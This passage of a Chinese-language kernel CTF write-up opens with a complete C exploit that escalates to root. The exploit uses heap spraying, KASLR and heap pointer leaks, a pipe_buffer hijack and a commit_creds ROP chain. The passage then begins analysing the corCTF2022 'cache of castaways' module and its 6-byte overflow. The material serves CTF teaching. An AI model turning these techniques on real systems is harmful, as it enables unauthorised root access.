class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_NUM (2048 + 128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_NUM 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cormon_fd;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seq_confuse</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_ret = <span class="number">0xFFFFFFFF817AD641</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8116926d</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8245A960</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810EBA40</span>;</span><br><span class="line"><span class="type">size_t</span> pop_r14_pop_r15_ret = <span class="number">0xffffffff81001615</span>;</span><br><span class="line"><span class="type">size_t</span> find_task_by_vpid = <span class="number">0xFFFFFFFF810E4FC0</span>;</span><br><span class="line"><span class="type">size_t</span> init_fs = <span class="number">0xFFFFFFFF82589740</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff8101f5fc</span>;</span><br><span class="line"><span class="type">size_t</span> add_rax_rcx_ret = <span class="number">0xffffffff8102396f</span>;</span><br><span class="line"><span class="type">size_t</span> mov_mmrax_rbx_pop_rbx_ret = <span class="number">0xffffffff817e1d6d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff811bce34</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_ret = <span class="number">0xffffffff81a05418</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81c00f97</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line"></span><br><span class="line">    cormon_fd = open(<span class="string">&quot;/proc_rw/cormon&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (cormon_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open cormon.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="type">int</span> target_key;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saturating kmalloc-32 partial slabs...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open stat.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2048</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying user keys in kmalloc-32...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; KEY_NUM; j++) &#123;</span><br><span class="line">                setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;aaaaaa&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">                key_alloc(j, buf, <span class="number">32</span>);</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">72</span>) &#123;</span><br><span class="line">                    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">14</span>; k++) &#123;</span><br><span class="line">                        create_poll_thread(</span><br><span class="line">                            PAGE_SIZE + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), </span><br><span class="line">                            <span class="number">3000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">                    wait_poll_start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Corrupting poll_list next pointer...&quot;</span>);</span><br><span class="line">            write(cormon_fd, buf, PAGE_SIZE);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">            join_poll_threads(seq_confuse, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting user key size / Spraying seq_operations structures...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking kernel pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">int</span> len = key_read(i, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        kernel_offset = search_kernel_offset(buf, len);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">            target_key = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak kernel offset,try again.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    push_rsi_pop_rsp_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    pop_r14_pop_r15_ret += kernel_offset;</span><br><span class="line">    find_task_by_vpid += kernel_offset;</span><br><span class="line">    init_fs += kernel_offset;</span><br><span class="line">    pop_rcx_ret += kernel_offset;</span><br><span class="line">    add_rax_rcx_ret += kernel_offset;</span><br><span class="line">    mov_mmrax_rbx_pop_rbx_ret += kernel_offset;</span><br><span class="line">    pop_rbx_ret += kernel_offset;</span><br><span class="line">    swapgs_ret += kernel_offset;</span><br><span class="line">    iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing user keys...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != target_key) &#123;</span><br><span class="line">            key_unlink(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying tty_file_private / tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="type">int</span> tty_fd[TTY_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        tty_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (tty_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking heap pointer...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> target_object = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> len = key_read(target_key, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    qword_dump(<span class="string">&quot;dump leak memory&quot;</span>, buf, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> *<span class="title">head</span> =</span> (<span class="type">void</span> *) &amp;buf[i];</span><br><span class="line">        <span class="keyword">if</span> (is_dir_mapping_addr((<span class="type">size_t</span>) head-&gt;tty) &amp;&amp; !(((<span class="type">size_t</span>) head-&gt;tty) &amp; <span class="number">0xFF</span>)</span><br><span class="line">            &amp;&amp; head-&gt;<span class="built_in">list</span>.next == head-&gt;<span class="built_in">list</span>.prev &amp;&amp; head-&gt;<span class="built_in">list</span>.prev != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            qword_dump(<span class="string">&quot;leak tty_struct addr from tty_file_private&quot;</span>, &amp;buf[i], </span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_file_private));</span><br><span class="line">            target_object = (<span class="type">size_t</span>) head-&gt;tty;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] tty_struct addr: %p\n&quot;</span>, target_object);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (target_object == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] failed to leak tty_struct addr.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing seq_operation structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2048</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        close(seq_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">192</span>; i++) &#123;</span><br><span class="line">        create_poll_thread(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    wait_poll_start();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing corrupted key...&quot;</span>);</span><br><span class="line">    key_unlink(target_key);</span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC key</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting poll_list next pointer...&quot;</span>);</span><br><span class="line">    <span class="type">char</span> key[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">0</span>] = target_object - <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_NUM; i++) &#123;</span><br><span class="line">        setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;aaaaaa&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">        key_alloc(i, key, <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Freeing tty_struct structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TTY_NUM; i++) &#123;</span><br><span class="line">        close(tty_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">// GC TTYs</span></span><br><span class="line">    <span class="type">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying pipe_bufer structures...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        pipe(pipe_fd[i]);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;aaaaaa&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">    join_poll_threads(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ((<span class="keyword">struct</span> pipe_bufer *) buf)-&gt;ops = (<span class="type">void</span> *) (target_object + <span class="number">0x300</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) &amp;buf[<span class="number">0x300</span>])-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_ret;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) buf;</span><br><span class="line"></span><br><span class="line">    *rop++ = pop_r14_pop_r15_ret;</span><br><span class="line">    rop++;</span><br><span class="line">    rop++; <span class="comment">// ops</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// commit_creds(&amp;init_creds)</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = init_cred;</span><br><span class="line">    *rop++ = commit_creds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current = find_task_by_vpid(getpid())</span></span><br><span class="line">    *rop++ = pop_rdi_ret;</span><br><span class="line">    *rop++ = getpid();</span><br><span class="line">    *rop++ = find_task_by_vpid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// current-&gt;fs = &amp;init_fs</span></span><br><span class="line">    *rop++ = pop_rcx_ret;</span><br><span class="line">    *rop++ = <span class="number">0x6e0</span>;</span><br><span class="line">    *rop++ = add_rax_rcx_ret;</span><br><span class="line">    *rop++ = pop_rbx_ret;</span><br><span class="line">    *rop++ = init_fs;</span><br><span class="line">    *rop++ = mov_mmrax_rbx_pop_rbx_ret;</span><br><span class="line">    rop++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// back to user</span></span><br><span class="line">    *rop++ = swapgs_ret;</span><br><span class="line">    *rop++ = iretq;</span><br><span class="line">    *rop++ = (<span class="type">uint64_t</span>) get_shell;</span><br><span class="line">    *rop++ = user_cs;</span><br><span class="line">    *rop++ = user_rflags;</span><br><span class="line">    *rop++ = user_sp;</span><br><span class="line">    *rop++ = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying ROP chain...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        key_alloc(i, buf, <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking control flow...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>多试几次还是可以成功的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010203455359.png"
                      alt="image-20241010203455359.png"
                ></p>
<h2 id="corCTF2022-cache-of-castways"><a href="#corCTF2022-cache-of-castways" class="headerlink" title="corCTF2022 cache of castways"></a>corCTF2022 cache of castways</h2><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>保护机制</strong></p>
<p>题目给了<code>kconfig</code>文件，<code>SMAP</code>, <code>SMEP</code>, <code>KPTI</code>, <code>KASLR</code> 及常用的保护机制，内核版本是 <code>5.18.3</code> 所以禁用了 <code>msg_msg</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -m 4096M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot;</span> \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net \</span><br><span class="line">    -device e1000, netdev=net \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -initrd initramfs.cpio</span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<p>在启动脚本里加载了一个名为 <code>cache_of_castaway.ko</code> 的 LKM，按惯例丢进 IDA，在模块初始化时注册了设备并创建了一个 <code>kmem_cache</code>，分配的 object 的 size 为 <code>512</code>，创建 flag 为 <code>SLAB_ACCOUNT | SLAB_PANIC</code>，同时开启了 <code>CONFIG_MEMCG_KMEM=y</code>，这意味着这是一个<strong>独立的 kmem_cache</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  castaway_dev = <span class="number">255</span>;</span><br><span class="line">  qword_8A8 = (__int64)<span class="string">&quot;castaway&quot;</span>;</span><br><span class="line">  qword_8B0 = (__int64)&amp;castaway_fops;</span><br><span class="line">  _mutex_init(&amp;castaway_lock, <span class="string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;castaway_dev)</span><br><span class="line">    &amp;&amp; (castaway_arr = kmem_cache_alloc(kmalloc_caches[<span class="number">12</span>], <span class="number">3520LL</span>)) != <span class="number">0</span></span><br><span class="line">    &amp;&amp; (castaway_cachep = kmem_cache_create(<span class="string">&quot;castaway_cache&quot;</span>, <span class="number">0x200</span>LL, <span class="number">1LL</span>, <span class="number">0x4040000</span>LL, <span class="number">0LL</span>)) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = init_castaway_driver_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>设备只定义了一个 ioctl，其中包含分配与编辑堆块的功能且都有锁，最多可以分配 400 个 object，没有释放功能：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">3</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, a3, <span class="number">24LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      v3 = castaway_edit(v6[<span class="number">0</span>], v6[<span class="number">1</span>], v6[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_lock(&amp;castaway_lock);</span><br><span class="line">  v3 = castaway_ctr;</span><br><span class="line">  <span class="keyword">if</span> ( castaway_ctr &lt;= <span class="number">399</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++castaway_ctr;</span><br><span class="line">    v5 = (_QWORD *)(castaway_arr + <span class="number">8</span> * v3);</span><br><span class="line">    *v5 = kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="number">8</span> * v3) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))castaway_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>漏洞便存在于编辑堆块的 <code>castaway_edit()</code> 当中，在拷贝数据时会故意从 <code>object + 6</code> 的地方开始拷贝，从而存在一个 6 字节的溢出，这里因为是先拷贝到内核栈上再进行内核空间中的拷贝所以不会触发 <code>hardened usercopy</code> 的检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">size_t</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18F</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  _check_object_size(src, a2, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(src, a3, a2) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) + <span class="number">6LL</span>), src, a2);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>编辑堆块时我们应当向内核中传入如下结构：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>	size;</span><br><span class="line">    <span class="type">void</span> 	*buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

